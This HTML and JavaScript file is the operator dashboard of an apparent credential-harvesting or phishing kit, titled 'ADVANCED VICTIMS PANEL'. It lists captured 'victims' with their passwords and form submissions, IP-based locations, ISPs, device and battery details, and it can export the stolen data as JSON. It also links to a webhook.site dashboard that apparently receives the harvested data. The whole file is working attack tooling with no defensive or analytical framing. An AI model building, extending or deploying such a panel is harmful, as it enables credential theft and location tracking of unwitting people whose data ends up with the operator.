<!DOCTYPE html>
<html>
<head>
    <title>Advanced Stats</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: Arial; background: #0a0a0a; color: white; padding: 15px; } .header { text-align: center; margin-bottom: 20px; padding: 20px; background: #1a1a1a; border-radius: 10px; } .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; } .stat-card { background: #2a2a2a; padding: 15px; border-radius: 8px; text-align: center; } .victim-card { background: #333; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 4px solid #e50914; } .tab { background: #444; padding: 10px; margin: 5px; border-radius: 5px; cursor: pointer; } .tab.active { background: #e50914; } .data-section { display: none; } .data-section.active { display: block; } .button-group { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
    </style>
</head>
<body>
    <div class="header">
        <h1>üîç ADVANCED VICTIMS PANEL</h1>
        <div class="button-group">
            <button onclick="loadAllData()" style="background: #e50914; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin: 5px;">üîÑ LOAD DATA</button>
            <button onclick="clearAllData()" style="background: #ff4444; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin: 5px;">üóëÔ∏è CLEAR DATA</button>
            <button onclick="exportData()" style="background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin: 5px;">üì§ EXPORT DATA</button>
            <button onclick="window.open('https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b', '_blank')" style="background: #00cc66; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin: 5px;">üì° WEBHOOK DASHBOARD</button>
        </div>
    </div>
    <div class="stats-grid">
        <div class="stat-card"><h3>üìä Total Victims</h3><div id="totalCount">0</div></div>
        <div class="stat-card"><h3>üìç Locations</h3><div id="locationCount">0</div></div>
        <div class="stat-card"><h3>üì± Devices</h3><div id="deviceCount">0</div></div>
        <div class="stat-card"><h3>üîë Passwords</h3><div id="passwordCount">0</div></div>
    </div>
    <div style="display: flex; overflow-x: auto; margin-bottom: 20px;">
        <div class="tab active" onclick="showTab('victims')">Victims</div><div class="tab" onclick="showTab('locations')">Locations</div><div class="tab" onclick="showTab('devices')">Devices</div><div class="tab" onclick="showTab('passwords')">Passwords</div><div class="tab" onclick="showTab('technical')">Technical</div>
    </div>
    <div id="victims" class="data-section active"><h3>Recent Victims</h3><div id="victimsList"></div></div>
    <div id="locations" class="data-section"><h3>Location Data</h3><div id="locationsList"></div></div>
    <div id="devices" class="data-section"><h3>Device Information</h3><div id="devicesList"></div></div>
    <div id="passwords" class="data-section"><h3>Captured Data</h3><div id="passwordsList"></div></div>
    <div id="technical" class="data-section"><h3>Technical Data</h3><div id="technicalList"></div></div>
    <script>
        function loadAllData() { const victims = JSON.parse(localStorage.getItem('advanced_victims') || '[]'); document.getElementById('totalCount').textContent = victims.length; document.getElementById('locationCount').textContent = victims.filter(v => v.data && v.data.location).length; document.getElementById('deviceCount').textContent = new Set(victims.map(v => v.data && v.data.basic ? v.data.basic.deviceType : 'Unknown')).size; document.getElementById('passwordCount').textContent = victims.filter(v => v.type === 'password_input' || v.type === 'form_submission').length; displayVictims(victims); displayLocations(victims); displayDevices(victims); displayPasswords(victims); displayTechnical(victims); }
        function displayVictims(victims) { const list = document.getElementById('victimsList'); list.innerHTML = ''; if (victims.length === 0) { list.innerHTML = '<div class="victim-card">No victims data found</div>'; return; } victims.slice(-20).reverse().forEach((victim, index) => { const card = document.createElement('div'); card.className = 'victim-card'; const basic = victim.data && victim.data.basic ? victim.data.basic : {}; card.innerHTML = `<strong>Victim #${victims.length - index}</strong><div style="font-size: 12px; color: #ccc;">${victim.timestamp}</div><div>üì± ${basic.deviceType || 'Unknown'} | üåê ${basic.languages ? basic.languages[0] : 'Unknown'} | üìç ${basic.timezone || 'Unknown'}</div><div>üîó Referrer: ${basic.referrer || 'direct'}</div><button onclick="showDetails(${victims.length - 1 - index})" style="background: #666; color: white; border: none; padding: 5px 10px; border-radius: 3px; margin-top: 5px; font-size: 12px;">View Details</button><button onclick="deleteVictim(${victims.length - 1 - index})" style="background: #ff4444; color: white; border: none; padding: 5px 10px; border-radius: 3px; margin-top: 5px; font-size: 12px;">Delete</button>`; list.appendChild(card); }); }
        function displayLocations(victims) { const list = document.getElementById('locationsList'); list.innerHTML = ''; const locations = victims.filter(v => v.data && v.data.location && v.data.location.ipBased); if (locations.length === 0) { list.innerHTML = '<div class="victim-card">No location data found</div>'; return; } locations.forEach((victim, index) => { const loc = victim.data.location.ipBased; const card = document.createElement('div'); card.className = 'victim-card'; card.innerHTML = `<strong>${loc.country || 'Unknown'} - ${loc.city || 'Unknown'}</strong><div>IP: ${loc.ip || 'Unknown'}</div><div>ISP: ${loc.org || 'Unknown'}</div><div>Region: ${loc.region || 'Unknown'}</div><div style="font-size: 12px; color: #ccc;">${victim.timestamp}</div>`; list.appendChild(card); }); }
        function displayDevices(victims) { const list = document.getElementById('devicesList'); list.innerHTML = ''; const devices = {}; victims.forEach(victim => { const device = victim.data && victim.data.basic ? victim.data.basic.deviceType : 'Unknown'; devices[device] = (devices[device] || 0) + 1; }); if (Object.keys(devices).length === 0) { list.innerHTML = '<div class="victim-card">No device data found</div>'; return; } for (const [device, count] of Object.entries(devices)) { const card = document.createElement('div'); card.className = 'victim-card'; card.innerHTML = `<strong>${device}</strong>: ${count} victims`; list.appendChild(card); } }
        function displayPasswords(victims) { const list = document.getElementById('passwordsList'); list.innerHTML = ''; const passwordData = victims.filter(v => v.type === 'password_input' || v.type === 'form_submission'); if (passwordData.length === 0) { list.innerHTML = '<div class="victim-card">No password data found</div>'; return; } passwordData.forEach((victim, index) => { const card = document.createElement('div'); card.className = 'victim-card'; card.innerHTML = `<strong>${victim.type.toUpperCase()}</strong><div>Data: ${JSON.stringify(victim.formData || victim.value)}</div><div style="font-size: 12px; color: #ccc;">${victim.timestamp}</div>`; list.appendChild(card); }); }
        function displayTechnical(victims) { const list = document.getElementById('technicalList'); list.innerHTML = ''; const technicalData = victims.filter(v => v.data && v.data.technical); if (technicalData.length === 0) { list.innerHTML = '<div class="victim-card">No technical data found</div>'; return; } technicalData.forEach((victim, index) => { const card = document.createElement('div'); card.className = 'victim-card'; card.innerHTML = `<strong>Technical Data #${index + 1}</strong><div>Battery: ${victim.data.technical.battery ? Math.round(victim.data.technical.battery.level * 100) + '%' : 'N/A'}</div><div>Network: ${victim.data.technical.network ? victim.data.technical.network.type : 'N/A'}</div><div style="font-size: 12px; color: #ccc;">${victim.timestamp}</div><button onclick="showDetails(${victims.indexOf(victim)})" style="background: #666; color: white; border: none; padding: 5px 10px; border-radius: 3px; margin-top: 5px; font-size: 12px;">View Full Data</button>`; list.appendChild(card); }); }
        function showTab(tabName) { document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active')); document.querySelectorAll('.data-section').forEach(section => section.classList.remove('active')); const tabs = ['victims','locations','devices','passwords','technical']; const tabIndex = tabs.indexOf(tabName); if (tabIndex !== -1) { document.querySelectorAll('.tab')[tabIndex].classList.add('active'); } document.getElementById(tabName).classList.add('active'); }
        function showDetails(index) { const victims = JSON.parse(localStorage.getItem('advanced_victims') || '[]'); const victim = victims[index]; if (victim) { const detailsWindow = window.open('', '_blank'); detailsWindow.document.write(`<html><head><title>Victim Details #${index}</title></head><body style="font-family: Arial; background: #1a1a1a; color: white; padding: 20px;"><h1>Victim Details #${index}</h1><pre style="background: #2a2a2a; padding: 20px; border-radius: 5px; overflow: auto;">${JSON.stringify(victim, null, 2)}</pre><button onclick="window.close()" style="background: #e50914; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin-top: 10px;">Close</button></body></html>`); } }
        function deleteVictim(index) { if (confirm('Are you sure you want to delete this victim?')) { const victims = JSON.parse(localStorage.getItem('advanced_victims') || '[]'); victims.splice(index, 1); localStorage.setItem('advanced_victims', JSON.stringify(victims)); loadAllData(); } }
        function clearAllData() { if (confirm('Are you sure you want to delete ALL data? This cannot be undone.')) { localStorage.removeItem('advanced_victims'); loadAllData(); } }
        function exportData() { const victims = JSON.parse(localStorage.getItem('advanced_victims') || '[]'); const dataStr = JSON.stringify(victims, null, 2); const dataBlob = new Blob([dataStr], {type: 'application/json'}); const url = URL.createObjectURL(dataBlob); const link = document.createElement('a'); link.href = url; link.download = `victims_data_${new Date().toISOString().split('T')[0]}.json`; link.click(); URL.revokeObjectURL(url); }
        setInterval(loadAllData, 15000); loadAllData();
    </script>
</body>
</html>
